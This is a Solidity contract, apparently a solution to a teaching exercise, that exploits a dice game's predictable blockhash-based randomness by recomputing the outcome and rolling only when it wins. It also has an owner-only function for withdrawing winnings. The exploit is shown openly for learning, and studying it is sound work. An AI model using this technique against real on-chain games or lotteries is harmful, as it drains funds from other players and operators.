pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {

    DiceGame public diceGame;

    constructor(address payable diceGameAddress) payable{
        diceGame = DiceGame(diceGameAddress);
    }

    //Add withdraw function to transfer ether from the rigged contract to an address


    //Add riggedRoll() function to predict the randomness in the DiceGame contract and only roll when it's going to be a winner
    function riggedRoll() public {

        bytes32 prevhash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevhash, address(diceGame), diceGame.nonce()));

        uint256 randomNumber = uint256(hash) % 16;

        console.log('\t',"   Nonce (Rigged):", diceGame.nonce());        
        console.log('\t',"   Dice Game Roll (Rigged):",randomNumber);
 
        uint256 balance = address(this).balance;
        uint256 playingFee = 0.002 ether;

        require(balance >= playingFee, "Not enough ether to roll a dice");

        require (randomNumber <= 2, "Play only if random number <= 2");
        // if (randomNumber <= 2){
            // this is rigged now - because we are predicting random number before roll
            // and entering only if random number is less than or equal to 2
            // notice that we are using same logic as dicegame contract to generate random number
            console.log('\t',"   Calling roll a dice with random number: %s eth: %s:",randomNumber, playingFee);
            diceGame.rollTheDice{value: address(this).balance}();
        // }
    }

    function withdraw(address _addr, uint256 _amount) public onlyOwner{
        require(address(this).balance >= _amount, "Withdrawal exceeds balance in account");

        (bool success, ) = _addr.call{value: _amount}("");
        require(success, "Withdrawal failed");
    }

    //Add receive() function so contract can receive Eth
    receive() external payable{
        console.log("----- receive:", msg.value);
    }
    
     fallback() external payable {
        console.log("----- fallback:", msg.value);
    }
}
